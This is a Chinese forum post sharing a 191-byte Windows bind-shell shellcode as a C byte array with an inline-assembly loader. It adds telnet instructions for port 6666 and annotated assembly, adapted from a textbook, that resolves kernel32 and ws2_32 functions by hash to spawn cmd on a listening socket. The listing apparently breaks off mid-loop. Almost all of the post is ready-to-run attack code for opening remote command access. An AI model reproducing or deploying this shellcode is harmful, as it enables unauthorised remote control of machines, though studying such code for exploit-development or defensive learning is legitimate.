
# [原创]191个字节的bindshell

更改后的源码如下

```c
#include<stdio.h>

#include<stdlib.h>

char sc[]="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x59\x81\xC9\xD3"

"\x62\x30\x20\x41\x43\x4D\x64\xE8\x00\x00\x00\x00\x58\x83\xE8\x10\x99\x96\x8D\x7E\xE8\x64\x8B\x1D\x30\x00\x00\x00\x8B\x4B\x0C\x8B"

"\x49\x1C\x8B\x09\x8B\x69\x08\x99\xB6\x03\x2B\xE2\x66\xBA\x33\x32\x52\x68\x77\x73\x32\x5F\x54\xAC\x3C\xD3\x75\x06\x95\xFF\x57\xF4"

"\x95\x57\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\xAC\x34\x71\x2A\xD0\x3C"

"\x71\x75\xF7\x3A\x54\x24\x1C\x75\xEA\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3B"

"\xF7\x75\xB4\x5E\x54\x6A\x02\xAD\xFF\xD0\x88\x46\x13\x8D\x48\x30\x8B\xFC\xF3\xAB\x40\x50\x40\x50\xAD\xFF\xD0\x95\xB8\x02\xFF\x1A"

"\x0A\x32\xE4\x50\x54\x55\xAD\xFF\xD0\x85\xC0\x74\xF8\xFE\x44\x24\x2D\x83\xEF\x6C\xAB\xAB\xAB\x58\x54\x54\x50\x50\x50\x54\x50\x50"

"\x56\x50\xFF\x56\xE4\xFF\x56\xE8\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

;

int main()

{

        \_asm{

                    lea eax,sc

                        push eax

                        ret

        }

        printf("成功,现在退出");

        return 1;

}
```

运行以上程序,用局域网内的其他计算机可以远程登录,登录命令为 `telnet ip 端口号`

例如:`telnet 127.0.0.1 6666`

对于此例端口号为`6666`

对于书上第134页的代码稍作修改

因为`;assume:eax points here`并不总是成立的,故更改如下

```c
main()

{

        \_\_asm{

asm\_begin:

                        nop

                        nop

                        nop

                        nop

WriteHere://光盘中的源码nop有点少,故有多添了一点                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                        nop

                ; start of shellcode

                ; assume: eax points here //假设不一定成立,故就会出现异常.所以应该添加额外的代码取得                //此段的地址

                ; function hashes (executable as nop-equivalent)

function\_hashes:

                        \_emit 0x59        ; LoadLibraryA ; pop ecx

                        \_emit 0x81         ; CreateProcessA ; or ecx, 0x203062d3

                        \_emit 0xc9         ; ExitProcess

                        \_emit 0xd3         ; WSAStartup

                        \_emit 0x62         ; WSASocketA

                        \_emit 0x30         ; bind

                        \_emit 0x20         ; listen

                        \_emit 0x41         ; accept ; inc ecx

cmd\_begin:

                ; "CMd"

                        \_emit 0x43         ; inc ebx

                        \_emit 0x4d         ; dec ebp

                        \_emit 0x64         ; FS:

                        call begin

begin:

                        pop eax

                        sub eax,0x10                        //eax已经指向了目标位置function\_hashes

                ; start of proper code

                        cdq                                         ; set edx = 0 (eax points to stack so is less than 0x80000000)

                        xchg eax, esi                         ; esi = addr of first function hash

                        lea edi, [esi - 0x18]         ; edi = addr to start writing function

                                                                        ; addresses (last addr will be written just

                                                                        ; before "cmd")

                ; find base addr of kernel32.dll

                //        mov ebx, fs:[edx + 0x30]         ; ebx = address of PEB

                        //需要更改成如下                                               mov ebx, fs:[ 0x30]         ; ebx = address of PEB

                        mov ecx, [ebx + 0x0c]                 ; ecx = pointer to loader data

                        mov ecx, [ecx + 0x1c]                 ; ecx = first entry in initialisation order list

                        mov ecx, [ecx]                                 ; ecx = second entry in list (kernel32.dll)

                        mov ebp, [ecx + 0x08]                 ; ebp = base address of kernel32.dll

                        cdq //edx应该清零

                ; make some stack space

                        mov dh, 0x03                         ; sizeof(WSADATA) is 0x190

                        sub esp, edx

                ; push a pointer to "ws2\_32" onto stack

                        mov dx, 0x3233                         ; rest of edx is null

                     push edx

                        push 0x5f327377

                        push esp

                find\_lib\_functions:

                        lodsb                                         ; load next hash into al and increment esi

                        cmp al, 0xd3                                 ; hash of WSAStartup - trigger

                                                                        ; LoadLibrary("ws2\_32")

                        jne find\_functions

                        xchg eax, ebp                         ; save current hash

                        call [edi - 0xc]                         ; LoadLibraryA

                        xchg eax, ebp                         ; restore current hash, and update ebp

                                                                        ; with base address of ws2\_32.dll

                        push edi                                         ; save location of addr of first winsock function

                find\_functions:

                        pushad                                                 ; preserve registers

                        mov eax, [ebp + 0x3c]                ; eax = start of PE header

                        mov ecx, [ebp + eax + 0x78]        ; ecx = relative offset of export table

                        add ecx, ebp                                 ; ecx = absolute addr of export table

                        mov ebx, [ecx + 0x20]                 ; ebx = relative offset of names table

                        add ebx, ebp                                 ; ebx = absolute addr of names table

                        xor edi, edi                                 ; edi will count through the functions

                next\_function\_loop:

                        inc edi                                         ; increment function counter

                        mov esi, [ebx + edi \* 4]         ; esi = relative offset of current function name

                        add esi, ebp                                 ; esi = absolute addr of current function name

                        cdq                                                 ; dl will hold hash (we know eax is small)

                hash\_loop:

                        lodsb                                         ; load next char into al and increment esi

                        xor al, 0x71                                 ; XOR current char with 0x71

                        sub dl, al                                 ; update hash with current char

                        cmp al, 0x71                                 ; loop until we reach end of string

                        jne hash\_loop

                        cmp dl, [esp + 0x1c]                 ; compare to the requested hash (saved on stack from pushad)

                        jnz next\_function\_loop
```
